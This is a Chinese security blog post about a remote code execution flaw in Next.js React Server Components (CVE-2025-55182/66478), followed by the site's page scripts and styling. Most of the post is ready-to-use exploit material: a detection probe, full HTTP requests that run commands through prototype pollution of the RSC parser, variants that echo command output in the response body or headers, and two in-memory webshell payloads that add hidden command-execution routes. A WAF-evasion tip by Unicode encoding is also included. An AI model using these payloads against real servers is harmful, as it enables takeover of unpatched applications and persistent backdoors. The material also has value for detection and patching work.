---
title: "Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)"
source: https://mrxn.net/jswz/nextjs-rce-cve.html
---

# Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/5 10:20
* 4448浏览
* [0评论](#comment)
* 50分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 前言

Next.js 默认配置即可RCE，速修！

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/92e1b30fdd3545899c3b00daa2f94e7d.webp)

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/6de9db61d041429d94f1fd36d360b236.webp)

# 漏洞检测

可使用如下精简无害化poc进行探测扫描，如果响应500错误，且响应body包含
`E{"digest"`
、
`digest`
或者
`Error`
这些错误中的两个以上，即表明目标可能存在next.js rce漏洞。

* 这是 Next.js 在开发模式或特定生产配置下，发生 RSC 错误时返回的特有错误格式。digest 是 Next.js 用来标识错误的哈希值。
* 同时满足这两个条件，可以高置信度地确认漏洞存在。因为这不仅证明了服务器崩溃了，还证明了崩溃是由 RSC 相关的错误引起的。

```
POST / HTTP/1.1
Host: your-nextjs-app.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA1B2C3D4E5F6G7H8
Next-Action: 9f8c7b6a5d4e3c2b1a0f9e8d7c6b5a4d
X-Nextjs-Request-Id: 123e4567-e89b-12d3-a456-426614174000
Next-Router-State-Tree: [[["",{"children":["__PAGE__",{}]},null,null,true]]
Content-Length: 234

------WebKitFormBoundaryA1B2C3D4E5F6G7H8
Content-Disposition: form-data; name="1"

{}
------WebKitFormBoundaryA1B2C3D4E5F6G7H8
Content-Disposition: form-data; name="0"

["$1:a:a"]
------WebKitFormBoundaryA1B2C3D4E5F6G7H8--
```

# 漏洞利用

弹计算器

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/a16b8c2834ec46d4908c282922c88077.webp)

```
 POST / HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
 Next-Action: x
 X-Nextjs-Request-Id: b5dce965
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
 X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
 Content-Length: 565

 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
 Content-Disposition: form-data; name="0"

 {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
 Content-Disposition: form-data; name="1"

 "$@0"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
 Content-Disposition: form-data; name="2"

 []
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

## body回显

```
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('date',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/bd40845ce13b45d98a0f8d21f7ecf407.webp)

## header回显

```
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
```

## base64编码回显内容

只需要使用
`toString('base64')`
即可，如下图所示

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/f3c576a68d8344ea94dea3bb195e0854.webp)

## 内存马

```
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const o=http.Server.prototype.emit;http.Server.prototype.emit=function(e,...a){if(e==='request'){const[r,s]=a;const p=url.parse(r.url,true);if(p.pathname==='/exec'){const cmd=p.query.cmd;if(!cmd){s.writeHead(400);s.end('cmd parameter required');return true;}try{s.writeHead(200,{'Content-Type':'application/json'});s.end(cp.execSync(cmd,{encoding:'utf8',stdio:'pipe'}));}catch(e){s.writeHead(500);s.end('Error: '+e.message);}return true;}}return o.apply(this,arguments);};})();",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

```
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B\"}","_response":{"_prefix":"(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/cmd'&&req.method==='POST'){let body='';req.on('data',chunk=>body+=chunk.toString());req.on('end',()=>{try{const postData=JSON.parse(body);const cmd=postData.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));})}catch(e){res.writeHead(400,{'Content-Type':'application/json'});res.end(JSON.stringify({success:false,error:'Invalid JSON body'}));}});return;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
```

## Unicode编码

所有json内容都可以使用josn转换为Unicode的特性，可以使用我的在线工具
[JSON Unicode 转换器](https://pages.mrxn.net/JSON2Unicode.html "JSON Unicode 转换器")
来实现

![Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&CVE-2025-66478)](https://image.mrxn.net/907aa8051ab04ab498139ea04f58ad2e.webp)

更新了
[有关Next.js RCE(CVE-2025-51182) 的Bypass Waf 方式浅析](https://mrxn.net/jswz/nextjs-rce-bypass.html)

# 参考

* <https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3>
* <https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-55182.yaml>
* <https://github.com/langgenius/dify/issues/29233>
* <https://github.com/mrknow001/RSC_Detector>
* <https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478>

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  cve](https://mrxn.net/tag/cve)
* [#
  JavaScript](https://mrxn.net/tag/JavaScript)
* [#
  rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[Next.js 默认配置即可RCE，速修！附POC 回显、内存马、unicode编码(CVE-2025-55182&amp;CVE-2025-66478)](https://mrxn.net/jswz/nextjs-rce-cve.html)
  
文章链接：
<https://mrxn.net/jswz/nextjs-rce-cve.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/nextjs-rce-cve.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/nextjs-rce-cve.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});